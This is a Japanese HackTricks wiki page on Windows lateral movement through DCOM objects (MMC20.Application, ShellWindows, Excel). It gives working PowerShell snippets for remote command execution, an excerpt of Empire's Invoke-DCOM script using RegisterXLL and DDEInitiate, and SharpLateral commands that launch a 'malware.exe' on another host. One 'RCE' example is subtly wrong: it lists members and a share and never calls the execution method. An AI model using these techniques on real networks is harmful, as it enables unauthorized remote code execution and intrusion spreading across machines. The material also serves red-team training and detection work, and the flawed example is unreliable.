# DCOM Exec

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* あなたは**サイバーセキュリティ会社**で働いていますか？あなたの**会社をHackTricksで宣伝したいですか**？それとも**最新のPEASSにアクセスしたり、HackTricksをPDFでダウンロードしたいですか**？[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* **参加してください** [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に、または**私を** **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**でフォローしてください。**
* **あなたのハッキングトリックを共有するために、** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**この技術に関する詳細は、[https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)の元の投稿をチェックしてください。**

分散コンポーネントオブジェクトモデル（DCOM）オブジェクトは、オブジェクトとのネットワークベースの相互作用に対して興味深い機能を提供します。Microsoftは、DCOMおよびコンポーネントオブジェクトモデル（COM）に関する包括的なドキュメントを提供しており、[こちらでDCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx)と[こちらでCOM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx)にアクセスできます。DCOMアプリケーションのリストは、PowerShellコマンドを使用して取得できます：
```bash
Get-CimInstance Win32_DCOMApplication
```
COMオブジェクト、[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)は、MMCスナップイン操作のスクリプトを可能にします。特に、このオブジェクトには`Document.ActiveView`の下に`ExecuteShellCommand`メソッドが含まれています。このメソッドに関する詳細情報は[こちら](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)で確認できます。実行を確認してください：

この機能は、DCOMアプリケーションを介してネットワーク上でコマンドを実行することを容易にします。管理者としてDCOMにリモートで対話するために、PowerShellを次のように利用できます：
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドはDCOMアプリケーションに接続し、COMオブジェクトのインスタンスを返します。次に、ExecuteShellCommandメソッドを呼び出してリモートホスト上でプロセスを実行できます。このプロセスは以下のステップを含みます：

Check methods:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCEを取得する：
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**この技術に関する詳細は、元の投稿を確認してください [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

**MMC20.Application** オブジェクトは、明示的な "LaunchPermissions" が欠如しており、デフォルトで管理者のアクセスを許可する権限に設定されています。詳細については、スレッドを [こちら](https://twitter.com/tiraniddo/status/817532039771525120) で確認でき、明示的な Launch Permission がないオブジェクトをフィルタリングするために [@tiraniddo](https://twitter.com/tiraniddo) の OleView .NET の使用が推奨されます。

特に、`ShellBrowserWindow` と `ShellWindows` の2つのオブジェクトは、明示的な Launch Permissions が欠如しているために強調されました。`HKCR:\AppID\{guid}` の下に `LaunchPermission` レジストリエントリが存在しないことは、明示的な権限がないことを示しています。

###  ShellWindows
ProgID が欠如している `ShellWindows` に対しては、.NET メソッド `Type.GetTypeFromCLSID` と `Activator.CreateInstance` を使用して、その AppID を用いてオブジェクトのインスタンス化を行います。このプロセスでは、OleView .NET を利用して `ShellWindows` の CLSID を取得します。インスタンス化された後は、`WindowsShell.Item` メソッドを通じて相互作用が可能で、`Document.Application.ShellExecute` のようなメソッド呼び出しが行えます。

オブジェクトをインスタンス化し、リモートでコマンドを実行するための PowerShell コマンドの例が提供されました:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Lateral Movement with Excel DCOM Objects

横移動は、DCOM Excelオブジェクトを悪用することで達成できます。詳細情報については、[Cybereasonのブログ](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)でのDCOMを介した横移動のためのExcel DDEの活用に関する議論を読むことをお勧めします。

Empireプロジェクトは、DCOMオブジェクトを操作することによってExcelを使用したリモートコード実行（RCE）を示すPowerShellスクリプトを提供しています。以下は、[EmpireのGitHubリポジトリ](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で入手可能なスクリプトからの抜粋で、RCEのためにExcelを悪用するさまざまな方法を示しています：
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Lateral Movementのための自動化ツール

これらの技術を自動化するために2つのツールが強調されています：

- **Invoke-DCOM.ps1**: リモートマシンでコードを実行するためのさまざまなメソッドの呼び出しを簡素化するEmpireプロジェクトによって提供されるPowerShellスクリプト。このスクリプトはEmpireのGitHubリポジトリで入手可能です。

- **SharpLateral**: リモートでコードを実行するために設計されたツールで、次のコマンドで使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 自動ツール

* Powershellスクリプト [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) は、他のマシンでコードを実行するためのすべてのコメントされた方法を簡単に呼び出すことができます。
* また、[**SharpLateral**](https://github.com/mertdas/SharpLateral) を使用することもできます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## 参考文献

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

{% hint style="success" %}
AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
